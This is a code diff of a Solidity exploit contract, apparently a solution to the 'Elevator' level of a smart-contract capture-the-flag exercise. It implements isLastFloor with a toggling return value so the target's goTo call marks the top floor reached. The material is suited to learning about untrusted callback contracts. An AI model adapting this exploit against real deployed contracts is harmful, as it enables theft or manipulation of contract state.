@@ -1,40 +1,18 @@
-pragma solidity ^0.4.18;
+pragma solidity ^0.4.24;
 
+import "./levels/Elevator.sol";
 
-interface Building {
-    function isLastFloor(uint) view public returns (bool);
-}
+contract ElevatorHack is Building{
 
-contract BuildingHack is Building{
-    
-    Elevator e;
-    bool toggle;
-    
-    constructor(address _inst) public{
-        e = Elevator(_inst);
-        toggle = false;
+    bool public toggle = true;
+
+    function attack(address _instance) public {
+        Elevator(_instance).goTo(12);
     }
-    
-    function goTo(uint _floor){
-        e.goTo(_floor);
-    }
-    
-    function isLastFloor(uint) view public returns (bool){
+
+    // Impl interface recognized from invoker class.
+    function isLastFloor(uint) public view returns (bool){
         toggle = !toggle;
         return toggle;
     }
-}
-
-contract Elevator {
-  bool public top;
-  uint public floor;
-
-  function goTo(uint _floor) public {
-    Building building = Building(msg.sender);
-
-    if (! building.isLastFloor(_floor)) {
-      floor = _floor;
-      top = building.isLastFloor(floor);
-    }
-  }
 }
